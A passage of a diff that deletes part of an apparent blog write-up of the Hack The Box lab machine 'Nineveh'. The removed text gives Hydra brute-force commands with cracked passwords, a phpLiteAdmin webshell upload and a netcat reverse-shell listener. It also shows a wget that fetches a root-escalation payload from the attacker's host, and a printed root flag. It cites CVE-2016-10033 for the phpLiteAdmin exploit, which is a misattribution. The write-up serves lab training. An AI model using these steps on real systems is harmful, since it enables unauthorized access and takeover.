-    <p>Revealed usernames: <code>admin</code> and <code>amrois</code>.</p>
-
-    <h3>/db</h3>
-    <p>phpLiteAdmin v1.9 login panel.</p>
-
-    <h3>/secure_notes</h3>
-    <p>Image containing RSA keys for user <code>amrois</code> (SSH not open).</p>
-
-    <h2>Hydra Brute-Force</h2>
-
-    <h3>/department/login.php</h3>
-    <div class="snippet">
-      <pre class="code-block">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64</pre>
-    </div>
-    <p>Password: <code>1q2w3e4r5t</code></p>
-
-    <h3>/db/index.php (phpLiteAdmin)</h3>
-    <div class="snippet">
-      <pre class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64</pre>
-    </div>
-    <p>Password: <code>password123</code></p>
-
-    <h2>phpLiteAdmin Exploitation (CVE-2016-10033)</h2>
-    <p>Created a new SQLite database with a <code>.php</code> extension and inserted a PHP webshell. Accessed it to execute commands and confirmed RCE.</p>
-    <p>Upgraded to a full reverse shell using PentestMonkey’s payload:</p>
-    <div class="snippet">
-      <pre class="code-block">nc -lvnp 8090</pre>
-    </div>
-
-    <h2>Privilege Escalation</h2>
-    <p>Stabilized shell with Python3 and enumerated the system. Discovered a cron job running Chkrootkit.</p>
-    <p>Exploited known Chkrootkit LPE (executes <code>/tmp/update</code> with root privileges):</p>
-    <div class="snippet">
-      <pre class="code-block">wget 10.10.16.10/update
-chmod +x update</pre>
-    </div>
-
-    <p>Received root shell and retrieved the flag:</p>
-    <div class="snippet">
-      <pre class="code-block"># cat /root/root.txt
-79bcf1e7824499b9266be71dc77e0d7c</pre>
-    </div>
-
-    <h2>Conclusion</h2>
-    <p>Nineveh was an excellent box for practicing web enumeration, brute-forcing, RCE via phpLiteAdmin, and classic Linux privilege escalation via misconfigured security tools.</p>
-
-    <p>Machine pwned!</p>
-  </div>
-
-  <footer>
-    <p>© 2025 Sean Beattie. All rights reserved.</p>
-  </footer>
-
-  <script src="../js/script.js"></script>
 </body>
 </html>
